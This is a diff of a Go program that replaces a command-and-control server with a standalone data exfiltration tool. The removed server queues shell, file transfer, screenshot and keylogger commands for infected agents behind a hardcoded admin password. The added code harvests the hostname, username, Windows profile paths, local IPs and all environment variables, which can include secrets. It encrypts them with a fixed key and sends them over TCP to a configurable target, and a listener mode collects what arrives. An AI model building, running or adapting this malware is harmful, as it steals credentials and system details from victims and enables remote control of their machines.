@@ -4,94 +4,47 @@ import (
 	"crypto/aes"
 	"crypto/cipher"
 	"crypto/rand"
-	"crypto/sha256"
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"io"
 	"io/ioutil"
 	"log"
-	"net/http"
+	"net"
 	"os"
 	"strconv"
 	"strings"
-	"sync"
 	"time"
 )
 
-type Command struct {
-	ID      string `json:"id"`
-	Type    string `json:"type"`
-	Payload string `json:"payload"`
-	Target  string `json:"target"`
+type SystemData struct {
+	Timestamp   int64             `json:"timestamp"`
+	Hostname    string            `json:"hostname"`
+	Username    string            `json:"username"`
+	ComputerName string           `json:"computername"`
+	UserProfile string            `json:"userprofile"`
+	SystemRoot  string            `json:"systemroot"`
+	ProgramFiles string           `json:"programfiles"`
+	LocalIPs    []string          `json:"local_ips"`
+	CurrentDir  string            `json:"current_dir"`
+	Environment map[string]string `json:"environment"`
+	Processes   []string          `json:"processes"`
 }
 
-type Response struct {
-	ID       string `json:"id"`
-	Status   string `json:"status"`
-	Data     string `json:"data"`
-	AgentID  string `json:"agent_id"`
-	Timestamp int64  `json:"timestamp"`
-}
-
-type Agent struct {
-	ID        string    `json:"id"`
-	IP        string    `json:"ip"`
-	UserAgent string    `json:"user_agent"`
-	LastSeen  time.Time `json:"last_seen"`
-	Status    string    `json:"status"`
-	Commands  []Command `json:"commands"`
-}
-
-type C2Server struct {
-	agents     map[string]*Agent
-	commands   map[string]Command
-	responses  map[string]Response
-	mutex      sync.RWMutex
-	encryption bool
-	key        []byte
-	logFile    *os.File
-}
-
-var server *C2Server
+var encryptionKey []byte
 
 func init() {
-	server = &C2Server{
-		agents:     make(map[string]*Agent),
-		commands:   make(map[string]Command),
-		responses:  make(map[string]Response),
-		encryption: true,
-		key:        generateKey(),
+	// Generate a fixed encryption key for consistency
+	key := "PWNEXE_SECRET_KEY_2024"
+	hash := make([]byte, 32)
+	for i := 0; i < 32; i++ {
+		hash[i] = key[i%len(key)]
 	}
-	
-	logFile, err := os.OpenFile("c2_server.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-	if err != nil {
-		log.Fatal("Failed to open log file:", err)
-	}
-	server.logFile = logFile
-	
-	log.SetOutput(io.MultiWriter(os.Stdout, logFile))
+	encryptionKey = hash
 }
 
-func generateKey() []byte {
-	key := make([]byte, 32)
-	if _, err := rand.Read(key); err != nil {
-		log.Fatal("Failed to generate encryption key:", err)
-	}
-	return key
-}
-
-func (s *C2Server) log(level, message string) {
-	timestamp := time.Now().Format("2006-01-02 15:04:05")
-	log.Printf("[%s] %s: %s", timestamp, strings.ToUpper(level), message)
-}
-
-func (s *C2Server) encrypt(data []byte) ([]byte, error) {
-	if !s.encryption {
-		return data, nil
-	}
-	
-	block, err := aes.NewCipher(s.key)
+func encrypt(data []byte) ([]byte, error) {
+	block, err := aes.NewCipher(encryptionKey)
 	if err != nil {
 		return nil, err
 	}
@@ -109,12 +62,8 @@ func (s *C2Server) encrypt(data []byte) ([]byte, error) {
 	return gcm.Seal(nonce, nonce, data, nil), nil
 }
 
-func (s *C2Server) decrypt(data []byte) ([]byte, error) {
-	if !s.encryption {
-		return data, nil
-	}
-	
-	block, err := aes.NewCipher(s.key)
+func decrypt(data []byte) ([]byte, error) {
+	block, err := aes.NewCipher(encryptionKey)
 	if err != nil {
 		return nil, err
 	}
@@ -133,358 +82,212 @@ func (s *C2Server) decrypt(data []byte) ([]byte, error) {
 	return gcm.Open(nil, nonce, ciphertext, nil)
 }
 
-func (s *C2Server) authenticate(r *http.Request) bool {
-	authHeader := r.Header.Get("Authorization")
-	if authHeader == "" {
-		return false
+func collectSystemData() *SystemData {
+	data := &SystemData{
+		Timestamp:   time.Now().Unix(),
+		Environment: make(map[string]string),
 	}
 	
-	expectedHash := sha256.Sum256([]byte("admin:secret123"))
-	providedHash := sha256.Sum256([]byte(authHeader))
+	// Basic system info
+	data.Hostname, _ = os.Hostname()
+	data.Username = os.Getenv("USERNAME")
+	data.ComputerName = os.Getenv("COMPUTERNAME")
+	data.UserProfile = os.Getenv("USERPROFILE")
+	data.SystemRoot = os.Getenv("SYSTEMROOT")
+	data.ProgramFiles = os.Getenv("PROGRAMFILES")
+	data.CurrentDir, _ = os.Getwd()
 	
-	return string(expectedHash[:]) == string(providedHash[:])
-}
-
-func (s *C2Server) handleBeacon(w http.ResponseWriter, r *http.Request) {
-	if r.Method != "POST" {
-		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
-		return
-	}
-	
-	body, err := ioutil.ReadAll(r.Body)
-	if err != nil {
-		s.log("error", "Failed to read request body: "+err.Error())
-		http.Error(w, "Internal server error", http.StatusInternalServerError)
-		return
-	}
-	
-	decrypted, err := s.decrypt(body)
-	if err != nil {
-		s.log("error", "Failed to decrypt request: "+err.Error())
-		http.Error(w, "Bad request", http.StatusBadRequest)
-		return
-	}
-	
-	var response Response
-	if err := json.Unmarshal(decrypted, &response); err != nil {
-		s.log("error", "Failed to unmarshal response: "+err.Error())
-		http.Error(w, "Bad request", http.StatusBadRequest)
-		return
-	}
-	
-	s.mutex.Lock()
-	defer s.mutex.Unlock()
-	
-	agentID := response.AgentID
-	if agentID == "" {
-		agentID = r.RemoteAddr
-	}
-	
-	agent, exists := s.agents[agentID]
-	if !exists {
-		agent = &Agent{
-			ID:        agentID,
-			IP:        r.RemoteAddr,
-			UserAgent: r.UserAgent(),
-			Status:    "active",
-			Commands:  []Command{},
-		}
-		s.agents[agentID] = agent
-		s.log("info", "New agent connected: "+agentID)
-	}
-	
-	agent.LastSeen = time.Now()
-	agent.Status = "active"
-	
-	if response.ID != "" {
-		s.responses[response.ID] = response
-		s.log("info", fmt.Sprintf("Received response from %s: %s", agentID, response.Status))
-	}
-	
-	commands := []Command{}
-	for _, cmd := range agent.Commands {
-		if cmd.ID != "" {
-			commands = append(commands, cmd)
+	// Environment variables
+	for _, env := range os.Environ() {
+		pair := strings.SplitN(env, "=", 2)
+		if len(pair) == 2 {
+			data.Environment[pair[0]] = pair[1]
 		}
 	}
 	
-	responseData := map[string]interface{}{
-		"commands": commands,
-		"timestamp": time.Now().Unix(),
-	}
-	
-	responseBytes, _ := json.Marshal(responseData)
-	encrypted, err := s.encrypt(responseBytes)
-	if err != nil {
-		s.log("error", "Failed to encrypt response: "+err.Error())
-		http.Error(w, "Internal server error", http.StatusInternalServerError)
-		return
-	}
-	
-	w.Header().Set("Content-Type", "application/octet-stream")
-	w.Write(encrypted)
-}
-
-func (s *C2Server) handleAdmin(w http.ResponseWriter, r *http.Request) {
-	if !s.authenticate(r) {
-		w.Header().Set("WWW-Authenticate", "Basic realm=\"C2 Admin\"")
-		http.Error(w, "Unauthorized", http.StatusUnauthorized)
-		return
-	}
-	
-	switch r.Method {
-	case "GET":
-		s.handleAdminGet(w, r)
-	case "POST":
-		s.handleAdminPost(w, r)
-	default:
-		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
-	}
-}
-
-func (s *C2Server) handleAdminGet(w http.ResponseWriter, r *http.Request) {
-	s.mutex.RLock()
-	defer s.mutex.RUnlock()
-	
-	agents := make([]*Agent, 0, len(s.agents))
-	for _, agent := range s.agents {
-		if time.Since(agent.LastSeen) > 5*time.Minute {
-			agent.Status = "offline"
-		}
-		agents = append(agents, agent)
-	}
-	
-	response := map[string]interface{}{
-		"agents":    agents,
-		"commands":  s.commands,
-		"responses": s.responses,
-		"status":    "running",
-		"uptime":    time.Since(time.Now()).String(),
-	}
-	
-	w.Header().Set("Content-Type", "application/json")
-	json.NewEncoder(w).Encode(response)
-}
-
-func (s *C2Server) handleAdminPost(w http.ResponseWriter, r *http.Request) {
-	body, err := ioutil.ReadAll(r.Body)
-	if err != nil {
-		http.Error(w, "Failed to read body", http.StatusBadRequest)
-		return
-	}
-	
-	var command Command
-	if err := json.Unmarshal(body, &command); err != nil {
-		http.Error(w, "Invalid JSON", http.StatusBadRequest)
-		return
-	}
-	
-	if command.ID == "" {
-		command.ID = fmt.Sprintf("cmd_%d", time.Now().UnixNano())
-	}
-	
-	s.mutex.Lock()
-	defer s.mutex.Unlock()
-	
-	if command.Target == "all" {
-		for _, agent := range s.agents {
-			agent.Commands = append(agent.Commands, command)
-		}
-		s.log("info", fmt.Sprintf("Command %s sent to all agents", command.ID))
-	} else if agent, exists := s.agents[command.Target]; exists {
-		agent.Commands = append(agent.Commands, command)
-		s.log("info", fmt.Sprintf("Command %s sent to agent %s", command.ID, command.Target))
-	} else {
-		http.Error(w, "Target agent not found", http.StatusNotFound)
-		return
-	}
-	
-	s.commands[command.ID] = command
-	
-	w.Header().Set("Content-Type", "application/json")
-	json.NewEncoder(w).Encode(map[string]string{"status": "command queued", "id": command.ID})
-}
-
-func (s *C2Server) handleHealth(w http.ResponseWriter, r *http.Request) {
-	w.Header().Set("Content-Type", "application/json")
-	json.NewEncoder(w).Encode(map[string]interface{}{
-		"status":    "healthy",
-		"timestamp": time.Now().Unix(),
-		"agents":    len(s.agents),
-	})
-}
-
-func (s *C2Server) cleanup() {
-	ticker := time.NewTicker(1 * time.Minute)
-	go func() {
-		for range ticker.C {
-			s.mutex.Lock()
-			for id, agent := range s.agents {
-				if time.Since(agent.LastSeen) > 10*time.Minute {
-					delete(s.agents, id)
-					s.log("info", "Removed offline agent: "+id)
+	// Network interfaces
+	addrs, err := net.InterfaceAddrs()
+	if err == nil {
+		for _, addr := range addrs {
+			if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
+				if ipnet.IP.To4() != nil {
+					data.LocalIPs = append(data.LocalIPs, ipnet.IP.String())
 				}
 			}
-			s.mutex.Unlock()
 		}
-	}()
+	}
+	
+	// Simplified process list (just a placeholder)
+	data.Processes = []string{"system_data_collected"}
+	
+	return data
+}
+
+func sendDataToTarget(targetIP, targetPort string) error {
+	// Collect system data
+	systemData := collectSystemData()
+	
+	// Convert to JSON
+	jsonData, err := json.Marshal(systemData)
+	if err != nil {
+		return fmt.Errorf("failed to marshal data: %v", err)
+	}
+	
+	// Encrypt the data
+	encryptedData, err := encrypt(jsonData)
+	if err != nil {
+		return fmt.Errorf("failed to encrypt data: %v", err)
+	}
+	
+	// Connect to target
+	conn, err := net.Dial("tcp", targetIP+":"+targetPort)
+	if err != nil {
+		return fmt.Errorf("failed to connect to %s:%s: %v", targetIP, targetPort, err)
+	}
+	defer conn.Close()
+	
+	// Send data length first (8 bytes)
+	dataLen := len(encryptedData)
+	lenBytes := make([]byte, 8)
+	for i := 0; i < 8; i++ {
+		lenBytes[i] = byte(dataLen >> (i * 8))
+	}
+	
+	_, err = conn.Write(lenBytes)
+	if err != nil {
+		return fmt.Errorf("failed to send data length: %v", err)
+	}
+	
+	// Send the encrypted data
+	_, err = conn.Write(encryptedData)
+	if err != nil {
+		return fmt.Errorf("failed to send data: %v", err)
+	}
+	
+	fmt.Printf("[+] Data sent successfully to %s:%s (%d bytes)\n", targetIP, targetPort, len(encryptedData))
+	return nil
+}
+
+func startReceiver(port string) {
+	listener, err := net.Listen("tcp", ":"+port)
+	if err != nil {
+		log.Fatalf("Failed to start listener: %v", err)
+	}
+	defer listener.Close()
+	
+	fmt.Printf("[+] Data receiver started on port %s\n", port)
+	fmt.Printf("[+] Waiting for incoming data...\n")
+	
+	for {
+		conn, err := listener.Accept()
+		if err != nil {
+			fmt.Printf("[-] Failed to accept connection: %v\n", err)
+			continue
+		}
+		
+		go handleConnection(conn)
+	}
+}
+
+func handleConnection(conn net.Conn) {
+	defer conn.Close()
+	
+	fmt.Printf("[+] New connection from %s\n", conn.RemoteAddr().String())
+	
+	// Read data length (8 bytes)
+	lenBytes := make([]byte, 8)
+	_, err := io.ReadFull(conn, lenBytes)
+	if err != nil {
+		fmt.Printf("[-] Failed to read data length: %v\n", err)
+		return
+	}
+	
+	// Convert length bytes to int
+	var dataLen int64
+	for i := 0; i < 8; i++ {
+		dataLen |= int64(lenBytes[i]) << (i * 8)
+	}
+	
+	// Read the encrypted data
+	encryptedData := make([]byte, dataLen)
+	_, err = io.ReadFull(conn, encryptedData)
+	if err != nil {
+		fmt.Printf("[-] Failed to read data: %v\n", err)
+		return
+	}
+	
+	// Decrypt the data
+	decryptedData, err := decrypt(encryptedData)
+	if err != nil {
+		fmt.Printf("[-] Failed to decrypt data: %v\n", err)
+		return
+	}
+	
+	// Parse JSON data
+	var systemData SystemData
+	err = json.Unmarshal(decryptedData, &systemData)
+	if err != nil {
+		fmt.Printf("[-] Failed to parse JSON: %v\n", err)
+		return
+	}
+	
+	// Display the received data
+	fmt.Printf("\n[+] Received system data from %s:\n", conn.RemoteAddr().String())
+	fmt.Printf("    Timestamp: %s\n", time.Unix(systemData.Timestamp, 0).Format("2006-01-02 15:04:05"))
+	fmt.Printf("    Hostname: %s\n", systemData.Hostname)
+	fmt.Printf("    Username: %s\n", systemData.Username)
+	fmt.Printf("    Computer Name: %s\n", systemData.ComputerName)
+	fmt.Printf("    User Profile: %s\n", systemData.UserProfile)
+	fmt.Printf("    System Root: %s\n", systemData.SystemRoot)
+	fmt.Printf("    Program Files: %s\n", systemData.ProgramFiles)
+	fmt.Printf("    Current Directory: %s\n", systemData.CurrentDir)
+	fmt.Printf("    Local IPs: %v\n", systemData.LocalIPs)
+	fmt.Printf("    Environment Variables: %d items\n", len(systemData.Environment))
+	fmt.Printf("    Processes: %v\n", systemData.Processes)
+	
+	// Save to file
+	filename := fmt.Sprintf("received_data_%s.json", time.Now().Format("20060102_150405"))
+	err = ioutil.WriteFile(filename, decryptedData, 0644)
+	if err != nil {
+		fmt.Printf("[-] Failed to save data to file: %v\n", err)
+	} else {
+		fmt.Printf("[+] Data saved to %s\n", filename)
+	}
+	
+	fmt.Println()
 }
 
 func main() {
-	port := "8080"
-	if envPort := os.Getenv("C2_PORT"); envPort != "" {
-		if p, err := strconv.Atoi(envPort); err == nil && p > 0 && p < 65536 {
-			port = envPort
+	// Check if running as receiver mode
+	if len(os.Args) > 1 && os.Args[1] == "receive" {
+		port := "9000"
+		if len(os.Args) > 2 {
+			port = os.Args[2]
 		}
+		startReceiver(port)
+		return
 	}
 	
-	server.log("info", "C2 Server starting on port "+port)
-	server.log("info", "Encryption enabled: "+fmt.Sprintf("%t", server.encryption))
+	// Default: sender mode
+	targetIP := "127.0.0.1"
+	targetPort := "9000"
 	
-	http.HandleFunc("/beacon", server.handleBeacon)
-	http.HandleFunc("/admin", server.handleAdmin)
-	http.HandleFunc("/health", server.handleHealth)
+	// Get target from environment variables
+	if envIP := os.Getenv("TARGET_IP"); envIP != "" {
+		targetIP = envIP
+	}
+	if envPort := os.Getenv("TARGET_PORT"); envPort != "" {
+		targetPort = envPort
+	}
 	
-	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
-		w.Header().Set("Content-Type", "text/html")
-		w.Write([]byte(`
-<!DOCTYPE html>
-<html>
-<head>
-    <title>C2 Server Dashboard</title>
-    <style>
-        body { font-family: Arial, sans-serif; margin: 20px; }
-        .container { max-width: 1200px; margin: 0 auto; }
-        .header { background: #333; color: white; padding: 20px; border-radius: 5px; }
-        .section { margin: 20px 0; padding: 20px; border: 1px solid #ddd; border-radius: 5px; }
-        .agent { background: #f9f9f9; padding: 10px; margin: 10px 0; border-radius: 3px; }
-        .online { border-left: 4px solid #4CAF50; }
-        .offline { border-left: 4px solid #f44336; }
-        button { background: #4CAF50; color: white; padding: 10px 20px; border: none; border-radius: 3px; cursor: pointer; }
-        input, textarea { width: 100%; padding: 8px; margin: 5px 0; border: 1px solid #ddd; border-radius: 3px; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="header">
-            <h1>C2 Server Dashboard</h1>
-            <p>Monitor and control connected agents</p>
-        </div>
-        
-        <div class="section">
-            <h2>Send Command</h2>
-            <form id="commandForm">
-                <input type="text" id="target" placeholder="Agent ID or 'all'" required>
-                <select id="type" required>
-                    <option value="shell">Shell Command</option>
-                    <option value="download">Download File</option>
-                    <option value="upload">Upload File</option>
-                    <option value="screenshot">Screenshot</option>
-                    <option value="keylog">Keylogger</option>
-                </select>
-                <textarea id="payload" placeholder="Command payload" required></textarea>
-                <button type="submit">Send Command</button>
-            </form>
-        </div>
-        
-        <div class="section">
-            <h2>Connected Agents</h2>
-            <div id="agents"></div>
-        </div>
-        
-        <div class="section">
-            <h2>Command Responses</h2>
-            <div id="responses"></div>
-        </div>
-    </div>
-    
-    <script>
-        function loadData() {
-            fetch('/admin', {
-                headers: { 'Authorization': btoa('admin:secret123') }
-            })
-            .then(response => response.json())
-            .then(data => {
-                displayAgents(data.agents);
-                displayResponses(data.responses);
-            });
-        }
-        
-        function displayAgents(agents) {
-            const container = document.getElementById('agents');
-            container.innerHTML = '';
-            
-            Object.values(agents).forEach(agent => {
-                const div = document.createElement('div');
-                div.className = 'agent ' + (agent.status === 'active' ? 'online' : 'offline');
-                div.innerHTML = \`
-                    <h3>\${agent.id}</h3>
-                    <p><strong>IP:</strong> \${agent.ip}</p>
-                    <p><strong>Status:</strong> \${agent.status}</p>
-                    <p><strong>Last Seen:</strong> \${new Date(agent.last_seen).toLocaleString()}</p>
-                \`;
-                container.appendChild(div);
-            });
-        }
-        
-        function displayResponses(responses) {
-            const container = document.getElementById('responses');
-            container.innerHTML = '';
-            
-            Object.values(responses).forEach(response => {
-                const div = document.createElement('div');
-                div.className = 'agent';
-                div.innerHTML = \`
-                    <h4>Response \${response.id}</h4>
-                    <p><strong>Agent:</strong> \${response.agent_id}</p>
-                    <p><strong>Status:</strong> \${response.status}</p>
-                    <p><strong>Data:</strong> \${response.data}</p>
-                \`;
-                container.appendChild(div);
-            });
-        }
-        
-        document.getElementById('commandForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const command = {
-                target: document.getElementById('target').value,
-                type: document.getElementById('type').value,
-                payload: document.getElementById('payload').value
-            };
-            
-            fetch('/admin', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'Authorization': btoa('admin:secret123')
-                },
-                body: JSON.stringify(command)
-            })
-            .then(response => response.json())
-            .then(data => {
-                alert('Command sent: ' + data.id);
-                loadData();
-            });
-        });
-        
-        setInterval(loadData, 5000);
-        loadData();
-    </script>
-</body>
-</html>
-		`))
-	})
+	fmt.Printf("[*] Starting data exfiltration to %s:%s\n", targetIP, targetPort)
 	
-	server.cleanup()
-	
-	server.log("info", "Server started successfully")
-	server.log("info", "Dashboard available at: http://localhost:"+port)
-	server.log("info", "Admin API available at: http://localhost:"+port+"/admin")
-	server.log("info", "Beacon endpoint available at: http://localhost:"+port+"/beacon")
-	
-	if err := http.ListenAndServe(":"+port, nil); err != nil {
-		server.log("fatal", "Server failed to start: "+err.Error())
+	// Send data immediately
+	err := sendDataToTarget(targetIP, targetPort)
+	if err != nil {
+		fmt.Printf("[-] Failed to send data: %v\n", err)
 		os.Exit(1)
 	}
+	
+	fmt.Println("[+] Data exfiltration completed successfully")
 }
